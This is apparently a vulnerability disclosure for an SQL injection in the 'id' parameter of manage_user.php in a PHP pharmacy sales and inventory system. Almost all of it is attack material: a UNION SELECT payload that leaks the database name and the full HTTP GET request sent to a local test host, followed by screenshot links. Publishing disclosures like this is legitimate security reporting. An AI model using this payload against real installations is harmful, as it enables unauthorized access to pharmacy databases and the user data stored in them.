# Pharmacy Sales And Inventory System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/14500/pharmacy-sales-and-inventory-system-using-phpmysql-source-code.html

Vulnerability File: /pharmacy-sales-and-inventory-system/manage_user.php?id=

Vulnerability location: ip/pharmacy-sales-and-inventory-system/manage_user.php?id=, id

[+] Payload: /pharmacy-sales-and-inventory-system/manage_user.php?id=-1+UNION+ALL+SELECT+NULL,GROUP_CONCAT(database()),NULL,NULL,NULL--  // Leak place ---> id

```sql
GET /pharmacy-sales-and-inventory-system/manage_user.php?id=-1+UNION+ALL+SELECT+NULL,GROUP_CONCAT(database()),NULL,NULL,NULL-- HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=4k3d5u023qn0eacroobson4prq
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167059525-2af037b2-b0c1-4494-a05f-95d1c8cca062.png)

![image](https://user-images.githubusercontent.com/54017627/167059428-d903e9a2-84de-4454-8276-9712b7547882.png)
